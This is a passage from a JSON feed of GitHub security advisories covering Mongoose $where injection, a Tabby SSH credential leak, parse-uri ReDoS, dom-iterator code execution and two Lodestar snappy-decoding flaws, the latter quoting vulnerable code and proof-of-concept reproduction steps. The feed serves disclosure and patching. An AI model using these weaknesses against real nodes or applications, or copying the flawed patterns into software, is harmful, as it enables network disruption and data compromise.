            "content_html": "<p>Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the <code>$where</code> operator. This vulnerability arises from the ability of the <code>$where</code> clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>\n<p>NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23061\">https://nvd.nist.gov/vuln/detail/CVE-2025-23061</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc\">https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md\">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/8.9.5\">https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li>\n<li><a href=\"https://www.npmjs.com/package/mongoose?activeTab=versions\">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6\">https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4\">https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5\">https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/6.13.6\">https://github.com/Automattic/mongoose/releases/tag/6.13.6</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/7.8.4\">https://github.com/Automattic/mongoose/releases/tag/7.8.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m7xq-9374-9rvx\">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vg7j-7cwx-8wgw\">https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vg7j-7cwx-8wgw",
            "title": "[mongoose] Mongoose search injection vulnerability",
            "date_modified": "2025-01-17T18:02:41.000Z",
            "date_published": "2025-01-15T06:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vg7j-7cwx-8wgw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the <code>$where</code> operator. This vulnerability arises from the ability of the <code>$where</code> clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>\n<p>NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23061\">https://nvd.nist.gov/vuln/detail/CVE-2025-23061</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc\">https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md\">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/8.9.5\">https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li>\n<li><a href=\"https://www.npmjs.com/package/mongoose?activeTab=versions\">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6\">https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4\">https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5\">https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/6.13.6\">https://github.com/Automattic/mongoose/releases/tag/6.13.6</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/7.8.4\">https://github.com/Automattic/mongoose/releases/tag/7.8.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m7xq-9374-9rvx\">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vg7j-7cwx-8wgw\">https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vg7j-7cwx-8wgw",
            "title": "[mongoose] Mongoose search injection vulnerability",
            "date_modified": "2025-01-17T18:02:41.000Z",
            "date_published": "2025-01-15T06:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vg7j-7cwx-8wgw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in Eugeny Tabby 1.0.213 allows a remote attacker to obtain sensitive information via the server and sends the SSH username and password even when the host key verification fails.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-48460\">https://nvd.nist.gov/vuln/detail/CVE-2024-48460</a></li>\n<li><a href=\"https://github.com/Eugeny/tabby/issues/9955\">https://github.com/Eugeny/tabby/issues/9955</a></li>\n<li><a href=\"https://github.com/Eugeny/tabby/commit/1c077147acd0a6ec9f8ee80d83a3e9688fbb9444\">https://github.com/Eugeny/tabby/commit/1c077147acd0a6ec9f8ee80d83a3e9688fbb9444</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8vq4-8hfp-29xh\">https://github.com/advisories/GHSA-8vq4-8hfp-29xh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8vq4-8hfp-29xh",
            "title": "[tabby-ssh] Eugeny Tabby Sends Password Despite Host Key Verification Failure",
            "date_modified": "2025-01-17T16:28:35.000Z",
            "date_published": "2025-01-17T00:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8vq4-8hfp-29xh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36751\">https://nvd.nist.gov/vuln/detail/CVE-2024-36751</a></li>\n<li><a href=\"https://github.com/Kikobeats/parse-uri/issues/14\">https://github.com/Kikobeats/parse-uri/issues/14</a></li>\n<li><a href=\"https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233\">https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6fx8-h7jm-663j\">https://github.com/advisories/GHSA-6fx8-h7jm-663j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6fx8-h7jm-663j",
            "title": "[parseuri] parse-uri Regular expression Denial of Service (ReDoS)",
            "date_modified": "2025-01-17T15:39:06.000Z",
            "date_published": "2025-01-16T00:31:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6fx8-h7jm-663j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36751\">https://nvd.nist.gov/vuln/detail/CVE-2024-36751</a></li>\n<li><a href=\"https://github.com/Kikobeats/parse-uri/issues/14\">https://github.com/Kikobeats/parse-uri/issues/14</a></li>\n<li><a href=\"https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233\">https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6fx8-h7jm-663j\">https://github.com/advisories/GHSA-6fx8-h7jm-663j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6fx8-h7jm-663j",
            "title": "[parse-uri] parse-uri Regular expression Denial of Service (ReDoS)",
            "date_modified": "2025-01-17T15:39:06.000Z",
            "date_published": "2025-01-16T00:31:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6fx8-h7jm-663j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Unintended permanent chain split affecting greater than or equal to 25% of the network, requiring hard fork (network partition requiring hard fork)</p>\n<p>Lodestar does not verify checksum in snappy framing uncompressed chunks.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>In Req/Resp protocol the messages are encoded by using ssz_snappy encoding, which is a snappy framing compression over ssz encoded message.</p>\n<p>In snappy framing format there are uncompressed chunks, each such chunk is prefixed with a checksum.</p>\n<p>Let's see how golang implementation parses such chunks - <a href=\"https://github.com/golang/snappy/blob/master/decode.go#L176\">https://github.com/golang/snappy/blob/master/decode.go#L176</a></p>\n<pre><code>    case chunkTypeUncompressedData:\n            // Section 4.3. Uncompressed data (chunk type 0x01).\n            if chunkLen &lt; checksumSize {\n                r.err = ErrCorrupt\n                return r.err\n            }\n            buf := r.buf[:checksumSize]\n            if !r.readFull(buf, false) {\n                return r.err\n            }\n            checksum := uint32(buf[0]) | uint32(buf[1])&lt;&lt;8 | uint32(buf[2])&lt;&lt;16 | uint32(buf[3])&lt;&lt;24\n            // Read directly into r.decoded instead of via r.buf.\n            n := chunkLen - checksumSize\n            if n &gt; len(r.decoded) {\n                r.err = ErrCorrupt\n                return r.err\n            }\n            if !r.readFull(r.decoded[:n], false) {\n                return r.err\n            }\n            if crc(r.decoded[:n]) != checksum {\n                r.err = ErrCorrupt\n                return r.err\n            }\n            r.i, r.j = 0, n\n            continue\n</code></pre>\n<p>As you can see, if checksum is incorrect, decoder fails and returns error.</p>\n<p>Now let's look at lodestar decoder <a href=\"https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17\">https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17</a></p>\n<pre><code>uncompress(chunk: Uint8ArrayList): Uint8ArrayList | null {\n    this.buffer.append(chunk);\n    const result = new Uint8ArrayList();\n    while (this.buffer.length &gt; 0) {\n      if (this.buffer.length &lt; 4) break;\n\n      const type = getChunkType(this.buffer.get(0));\n      const frameSize = getFrameSize(this.buffer, 1);\n\n      if (this.buffer.length - 4 &lt; frameSize) {\n        break;\n      }\n\n      const data = this.buffer.subarray(4, 4 + frameSize);\n      this.buffer.consume(4 + frameSize);\n\n      if (!this.state.foundIdentifier &amp;&amp; type !== ChunkType.IDENTIFIER) {\n        throw \"malformed input: must begin with an identifier\";\n      }\n\n      if (type === ChunkType.IDENTIFIER) {\n        if (!Buffer.prototype.equals.call(data, IDENTIFIER)) {\n          throw \"malformed input: bad identifier\";\n        }\n        this.state.foundIdentifier = true;\n        continue;\n      }\n\n      if (type === ChunkType.COMPRESSED) {\n        result.append(uncompress(data.subarray(4)));\n      }\n      if (type === ChunkType.UNCOMPRESSED) {\n1)        result.append(data.subarray(4));\n      }\n    }\n    if (result.length === 0) {\n      return null;\n    }\n    return result;\n  }\n</code></pre>\n<p>As you can see, checksum is not verified, bytes are appended to 'result'</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<p>How to reproduce:</p>\n<p>get poc via <a href=\"https://gist.github.com/gln7/aab55674431b1c8d42a59ccf9d7cbf60\">gist link</a> and run it:</p>\n<pre><code>$ node dec1.mjs \nchecking chunk type=255\nchecking chunk type=1\ngot uncompressed chunk..\nDecompressed ok 124 bytes\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ChainSafe/lodestar/security/advisories/GHSA-m9c9-mc2h-9wjw\">https://github.com/ChainSafe/lodestar/security/advisories/GHSA-m9c9-mc2h-9wjw</a></li>\n<li><a href=\"https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300\">https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m9c9-mc2h-9wjw\">https://github.com/advisories/GHSA-m9c9-mc2h-9wjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m9c9-mc2h-9wjw",
            "title": "[@lodestar/reqresp] Lodestar snappy checksum issue",
            "date_modified": "2025-01-14T22:04:06.000Z",
            "date_published": "2025-01-14T22:04:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m9c9-mc2h-9wjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Unintended permanent chain split affecting greater than or equal to 25% of the network, requiring hard fork (network partition requiring hard fork)</p>\n<h3 id=\"description\">Description</h3>\n<p>Lodestar client may fail to decode snappy framing compressed messages.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>In Req/Resp protocol the message are encoded by using ssz_snappy encoding, which is basically snappy framing compression over ssz encoded message.</p>\n<p>It's mentioned here - <a href=\"https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/p2p-interface.md\">https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/p2p-interface.md</a></p>\n<pre><code>The token of the negotiated protocol ID specifies the type of encoding to be used for the req/resp interaction. Only one value is possible at this time:\n\nssz_snappy: The contents are first SSZ-encoded and then compressed with Snappy frames compression. For objects containing a single field, only the field is SSZ-encoded not a container with a single field. For example, the BeaconBlocksByRoot request is an SSZ-encoded list of Root's. This encoding type MUST be supported by all clients.\n</code></pre>\n<p>In snappy framing format there a few types of chunks.\nWe are interested in so called reserved skippable chunks. These are chunks with chunk type in range [0x80, 0xfd]\nLet's see how rust snappy handles them <a href=\"https://github.com/BurntSushi/rust-snappy/blob/master/src/read.rs#L137\">https://github.com/BurntSushi/rust-snappy/blob/master/src/read.rs#L137</a></p>\n<pre><code>impl&lt;R: io::Read&gt; io::Read for FrameDecoder&lt;R&gt; {\n    fn read(&amp;mut self, buf: &amp;mut [u8]) -&gt; io::Result&lt;usize&gt; {\n            ... \n           ...\n              let len = len64 as usize;\n            match ty {\n                Err(b) if 0x02 &lt;= b &amp;&amp; b &lt;= 0x7F =&gt; {\n                    // Spec says that chunk types 0x02-0x7F are reserved and\n                    // conformant decoders must return an error.\n                    fail!(Error::UnsupportedChunkType { byte: b });\n                }\n                Err(b) if 0x80 &lt;= b &amp;&amp; b &lt;= 0xFD =&gt; {\n                    // Spec says that chunk types 0x80-0xFD are reserved but\n                    // skippable.\n                    self.r.read_exact(&amp;mut self.src[0..len])?;\n                }\n</code></pre>\n<p>Similar code can be found in golang implementation - <a href=\"https://github.com/golang/snappy/blob/master/decode.go#L221\">https://github.com/golang/snappy/blob/master/decode.go#L221</a></p>\n<pre><code>func (r *Reader) fill() error {\n    ...\n    if chunkType &lt;= 0x7f {\n            // Section 4.5. Reserved unskippable chunks (chunk types 0x02-0x7f).\n            r.err = ErrUnsupported\n            return r.err\n        }\n        // Section 4.4 Padding (chunk type 0xfe).\n        // Section 4.6. Reserved skippable chunks (chunk types 0x80-0xfd).\n        if !r.readFull(r.buf[:chunkLen], false) {\n            return r.err\n        }\n</code></pre>\n<p>Now let's see how lodestar handles such chunks <a href=\"https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17\">https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17</a></p>\n<pre><code>uncompress(chunk: Uint8ArrayList): Uint8ArrayList | null {\n    this.buffer.append(chunk);\n    const result = new Uint8ArrayList();\n    while (this.buffer.length &gt; 0) {\n      if (this.buffer.length &lt; 4) break;\n\n      const type = getChunkType(this.buffer.get(0));\n      const frameSize = getFrameSize(this.buffer, 1);\n\n      if (this.buffer.length - 4 &lt; frameSize) {\n        break;\n      }\n\n      const data = this.buffer.subarray(4, 4 + frameSize);\n      this.buffer.consume(4 + frameSize);\n\n      if (!this.state.foundIdentifier &amp;&amp; type !== ChunkType.IDENTIFIER) {\n        throw \"malformed input: must begin with an identifier\";\n      }\n\n      if (type === ChunkType.IDENTIFIER) {\n        if (!Buffer.prototype.equals.call(data, IDENTIFIER)) {\n          throw \"malformed input: bad identifier\";\n        }\n        this.state.foundIdentifier = true;\n        continue;\n      }\n\n      if (type === ChunkType.COMPRESSED) {\n        result.append(uncompress(data.subarray(4)));\n      }\n      if (type === ChunkType.UNCOMPRESSED) {\n        result.append(data.subarray(4));\n      }\n    }\n    if (result.length === 0) {\n      return null;\n    }\n    return result;\n  }\n\n function getChunkType(value: number): ChunkType {\n  switch (value) {\n    case ChunkType.IDENTIFIER:\n      return ChunkType.IDENTIFIER;\n    case ChunkType.COMPRESSED:\n      return ChunkType.COMPRESSED;\n    case ChunkType.UNCOMPRESSED:\n      return ChunkType.UNCOMPRESSED;\n    case ChunkType.PADDING:\n      return ChunkType.PADDING;\n    default:\n      throw new Error(\"Unsupported snappy chunk type\");\n  }\n</code></pre>\n<p>As you can see, lodestar does not recognize such chunks.</p>\n<p>If it sees such chunk, function getChunkType() throws an exception and decoding fails.</p>\n<h3 id=\"impact-details\">Impact Details</h3>\n<p>Faulty nodes may trigger chain stall by sending messages which lodestar fails to parse, while other clients will be able to handle.</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<p>How to reproduce:</p>\n<ol>\n<li>get archive (via provided <a href=\"https://gist.github.com/gln7/bdde7f4e0bdf9d47bf810a015796867a\">gist link</a>), decode and unpack it:</li>\n</ol>\n<pre><code>$ base64 -d poc.txt &gt; poc.tgz\n$ tar zxf poc.tgz\n</code></pre>\n<ol start=\"2\">\n<li>run dec1.go to verify that our snappy file decompressed successfully</li>\n</ol>\n<pre><code>$ go run dec1.go\n\nreading 1.snappy...\nread 124 bytes, err &lt;nil&gt;\n</code></pre>\n<ol start=\"3\">\n<li>run dec1.mjs to verify that lodestar fails to decode such file</li>\n</ol>\n<pre><code>checking chunk type=255\nchecking chunk type=1\ngot uncompressed chunk..\nchecking chunk type=129\nfile:///../poc/dec1.mjs:74\n            throw new Error(\"Unsupported snappy chunk type\");\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ChainSafe/lodestar/security/advisories/GHSA-53rv-hcvm-rpp9\">https://github.com/ChainSafe/lodestar/security/advisories/GHSA-53rv-hcvm-rpp9</a></li>\n<li><a href=\"https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300\">https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-53rv-hcvm-rpp9\">https://github.com/advisories/GHSA-53rv-hcvm-rpp9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-53rv-hcvm-rpp9",
            "title": "[@lodestar/reqresp] Lodestar snappy decompression issue",
            "date_modified": "2025-01-14T22:04:01.000Z",
            "date_published": "2025-01-14T22:03:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-53rv-hcvm-rpp9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package dom-iterator before 1.0.1 are vulnerable to Arbitrary Code Execution due to use of the Function constructor without complete input sanitization. Function generates a new function body and thus care must be given to ensure that the inputs to Function are not attacker-controlled. The risks involved are similar to that of allowing attacker-controlled input to reach eval.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21541\">https://nvd.nist.gov/vuln/detail/CVE-2024-21541</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199\">https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199</a></li>\n<li><a href=\"https://github.com/matthewmueller/dom-iterator/commit/9e0e0fad5a251de5b42feb326c4204eb04080805\">https://github.com/matthewmueller/dom-iterator/commit/9e0e0fad5a251de5b42feb326c4204eb04080805</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8383166\">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8383166</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jrvm-mcxc-mf6m\">https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jrvm-mcxc-mf6m",
            "title": "[dom-iterator] dom-iterator code execution vulnerability",
            "date_modified": "2025-01-14T21:18:04.000Z",
            "date_published": "2024-11-13T06:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jrvm-mcxc-mf6m"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}